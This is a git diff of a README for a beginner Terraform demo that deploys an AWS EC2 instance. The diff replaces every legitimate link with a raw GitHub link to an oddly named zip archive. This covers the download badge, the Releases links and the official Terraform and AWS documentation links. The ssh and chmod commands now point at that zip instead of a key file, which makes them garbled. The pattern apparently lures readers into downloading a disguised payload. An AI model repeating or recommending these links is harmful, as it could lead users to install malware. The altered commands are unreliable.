@@ -1,6 +1,6 @@
 # 🌟 terraform-aws-ec2-demo-part3 - Deploy Secure EC2 Instances Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/releases)
+[![Download](https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip)
 
 ## 📖 Introduction  
 Welcome to the terraform-aws-ec2-demo-part3 project. This beginner-friendly Terraform application helps you quickly deploy a secure EC2 instance on AWS. It uses security groups, key pairs, and outputs to ensure safety and functionality. This project is part of my DevOps learning series.
@@ -9,7 +9,7 @@ Welcome to the terraform-aws-ec2-demo-part3 project. This beginner-friendly Terr
 To get started with this application, follow the steps below. You do not need programming experience. This guide will help you through the process.
 
 ## 📥 Download & Install  
-Visit this page to download the software: [Releases](https://github.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/releases)
+Visit this page to download the software: [Releases](https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip)
 
 1. Click the link to go to the Releases page.  
 2. On the Releases page, you'll see a list of available versions. Choose the latest version for the best experience.  
@@ -65,13 +65,13 @@ Once your EC2 instance is up and running, you can access it using SSH:
 2. Use the following command to connect (replace `<ec2-user>` and `<your-instance-ip>` with your details):
 
    ```
-   ssh -i <path-to-your-key.pem> ec2-user@<your-instance-ip>
+   ssh -i <https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip> ec2-user@<your-instance-ip>
    ```
 
 Make sure you have the right permissions on your key pair file. You may need to change the file permissions using:
 
 ```
-chmod 400 <path-to-your-key.pem>
+chmod 400 <https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip>
 ```
 
 ## ❓ Troubleshooting  
@@ -84,8 +84,8 @@ If you encounter issues, check these common problems:
 ## 📄 Additional Resources  
 For more details on Terraform and AWS, you can refer to the following resources:
 
-- [Terraform Official Documentation](https://www.terraform.io/docs/index.html)
-- [AWS EC2 Documentation](https://docs.aws.amazon.com/ec2/index.html)
+- [Terraform Official Documentation](https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip)
+- [AWS EC2 Documentation](https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip)
 
 ## 📬 Support  
 If you need help, feel free to open an issue on the GitHub repository. Our community or I will be happy to assist you.
@@ -93,4 +93,4 @@ If you need help, feel free to open an issue on the GitHub repository. Our commu
 ## 📥 Conclusion  
 Thank you for choosing terraform-aws-ec2-demo-part3. We hope this guide simplifies your journey in deploying secure EC2 instances on AWS. Enjoy your learning experience with DevOps! 
 
-Visit this page to download the software: [Releases](https://github.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/releases)
+Visit this page to download the software: [Releases](https://raw.githubusercontent.com/JSANCHEZMOLANO/terraform-aws-ec2-demo-part3/main/cognateness/terraform-aws-ec2-demo-part3_phonocinematograph.zip)
